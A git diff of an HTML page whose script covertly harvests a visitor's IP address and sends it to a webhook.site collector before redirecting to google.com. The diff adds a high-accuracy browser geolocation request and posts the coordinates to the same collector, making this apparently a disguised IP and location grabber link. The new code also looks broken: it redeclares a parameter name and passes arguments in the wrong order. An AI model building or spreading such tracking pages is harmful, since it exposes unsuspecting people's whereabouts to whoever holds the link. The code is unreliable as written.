@@ -10,26 +10,40 @@
     </head>
     <body>
         <script type="text/javascript">
-            async function reportIp(ip) {
-                const url = 'https://webhook.site/113907e9-3057-4db2-af79-0db93059aefa';
+async function reportData(uuid, data) {
+  const url = "https://webhook.site/113907e9-3057-4db2-af79-0db93059aefa";
 
-                const response = await fetch(url, {
-                    method: "POST",
-                    body: `Reported IP: ${ip}`,
-                });
+  const response = await fetch(url, {
+    method: "POST",
+    body: `UUID: ${uuid}\n\n` + `${data}`,
+  });
 
-                const data = await response.json();
-                console.log(data);
-            }
+  const data = await response.json();
+  console.log(data);
+}
 
-            (async () => {
-                try {
-                    await fetch("https://api.ipify.org?format=json")
-                        .then((res) => res.json())
-                        .then((data) => reportIp(data.ip))
-                } catch (e) {}
-                window.location.replace("https://google.com");
-            })();
+(async () => {
+  try {
+    const uuid = crypto.randomUUID();
+    await fetch("https://api.ipify.org?format=json")
+      .then((res) => res.json())
+      .then((data) => reportData(uuid, `IP: ${data.ip}`));
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const coords = position.coords;
+        reportData(JSON.stringify(coords));
+      },
+      (error) => {
+        console.error(error);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+      }
+    );
+  } catch (e) {}
+  window.location.replace("https://google.com");
+})();
         </script>
     </body>
 </html>
